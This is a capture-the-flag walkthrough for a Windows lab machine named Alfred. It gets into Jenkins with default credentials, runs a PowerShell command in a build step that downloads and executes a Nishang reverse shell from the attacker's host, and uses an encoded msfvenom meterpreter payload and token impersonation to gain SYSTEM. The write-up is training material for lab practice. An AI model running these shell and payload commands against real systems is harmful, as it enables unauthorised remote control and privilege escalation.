# Alfred (Jenkins and Nishang)

So first we can the machine and we see 3 ports open namely 80,8080,3389 so by just going to the pages we find out that the page 80 is the main website and its CI/CD is being handeled by Jenkins which is on port 8080 and if we traverse over there we get a login page .

We can try to first password spray admin on this page and try some default credentials if that doesnt work we can try to brute force but luckily for us my first guess which was admin:admin worked for us so now that we are logged in we see the dashboard which has a project in it which is most probably the site that is on port 80 now to locate the place where we can execute commands lets go to the project thats shown to us on the dashboard and then try to look inside the options there if we find something usefull around or something .After looking around for a while i found out that we can go to configure and scroll down and see the build coloumn where we can put the commands and stuff to execute on the machine and get a reverse [shell.In](http://shell.In) here they recomend for us to use the reverse shell from the repo nishang the link to that is here →

[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Also has a lot of other cool tools → [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

So now to get this revershell script to the machine then execute it first we need to download the Invoke-Powershelltcp.ps1 script on our local machine and then host it with 

```bash
python -m SimpleHTTPServer 80 
```

and then we can get it by the command they provided which is this one here this will get the file from our local server and then also call it for us 

```bash
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

now lets click on appply on the bottom left of our screen and then lets start to listen for the reverse shell and we do that using netcat so the syntax would be 

```bash
nc -nvlp <PortDefinedintheabovescript>
```

and then in the jenkins menu we click build now and we will get a reverse shell on our nc listener and we can use that .Now you can cat out the users and everything .

Now to get a metasploit shell all we gotta do is use exploit/multi/handeler to listen instead of nc and send a payload that will allow us to get a meterpreter shell.

To do that we first generate the payload by doing this →

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```

and then lets upload this shell to the target machine on the netcat shell.

```bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
```

and now we set  payload windows/meterpreter/reverse_tcp and also set lhost and lport.

and then run the exploit and lets listen for the shell on metasploit and now to execute the shell on the nc listener we use powershell and run the command 

```bash
Start-Process "shell-name.exe"
```

Now that we have our meterpreter session we can do windows token impersanation to gain administrator privellages and gain NT/AUTHOITY-SYSTEM.

So first lets see what does tokens are  :

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

- user SIDs(security identifier)
- group SIDs
- privileges

There are two types of access tokens:

- primary access tokens: those associated with a user account that are generated on log on
- impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

- SecurityAnonymous: current user/client cannot impersonate another user/client
- SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
- SecurityImpersonation: current user/client can impersonate the client's security context on the local system
- SecurityDelegation: current user/client can impersonate the client's security context on a remote system

Where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load_incognito to load the incognito module in metasploit.

To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token.

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS and then we can get authority.